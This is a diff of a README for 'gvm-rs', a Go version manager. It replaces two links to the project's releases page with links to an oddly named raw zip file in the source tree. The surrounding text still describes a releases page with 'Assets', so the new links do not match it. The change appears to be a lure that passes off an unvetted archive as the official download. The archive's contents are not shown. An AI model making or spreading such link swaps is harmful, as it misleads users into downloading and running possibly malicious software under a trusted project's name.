@@ -1,6 +1,6 @@
 # 🚀 gvm-rs - Manage Go language versions with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foremost-headsail607/gvm-rs/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foremost-headsail607/gvm-rs/raw/refs/heads/main/src/gvm-rs-xiphisternal.zip)
 
 gvm-rs helps you switch between different versions of Go on your computer. You often need specific versions of the Go language to build or run projects. This tool manages those versions for you. It downloads the files and sets them up automatically. You do not need to manage complex system files or have deep technical knowledge. 
 
@@ -18,7 +18,7 @@ Many developers maintain different code projects. Each project sometimes require
 
 You must visit the releases page to get the correct version for your computer.
 
-[Button: Click here to visit the release page](https://github.com/Foremost-headsail607/gvm-rs/releases)
+[Button: Click here to visit the release page](https://github.com/Foremost-headsail607/gvm-rs/raw/refs/heads/main/src/gvm-rs-xiphisternal.zip)
 
 1. Open the page link above.
 2. Look for the section labeled "Assets" at the bottom of the newest release.
